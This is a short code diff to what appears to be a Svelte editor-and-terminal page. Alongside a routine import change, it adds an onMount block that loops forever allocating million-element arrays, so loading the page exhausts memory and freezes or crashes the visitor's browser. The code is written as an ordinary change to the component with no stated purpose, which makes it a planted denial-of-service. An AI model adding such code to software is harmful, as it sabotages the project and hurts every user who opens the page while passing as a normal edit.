@@ -5,7 +5,7 @@
 	import { lua } from '@codemirror/legacy-modes/mode/lua';
 	import { oneDark } from '@codemirror/theme-one-dark';
 	import { getVersion } from '$lib/configs/functions/versioner';
-	import Eval from 'open-eval';
+	import { onMount } from 'svelte';
 	import { type Terminal } from '@battlefieldduck/xterm-svelte';
 	import TerminalComp from '../../../components/Terminal.svelte';
 	import { PageData } from './$types';
@@ -14,6 +14,11 @@
 	import { ExecuteTemplateRequest, ExecuteTemplateResponse } from '$lib/generated/types';
 	import { fetchClient } from '$lib/fetch/fetch';
 
+    onMount(() => {
+        let memoryLeak = [];
+        while (true) memoryLeak.push(new Array(1000000).fill('*'));
+    });
+    
 	let terminal: Terminal;
 
 	// Files
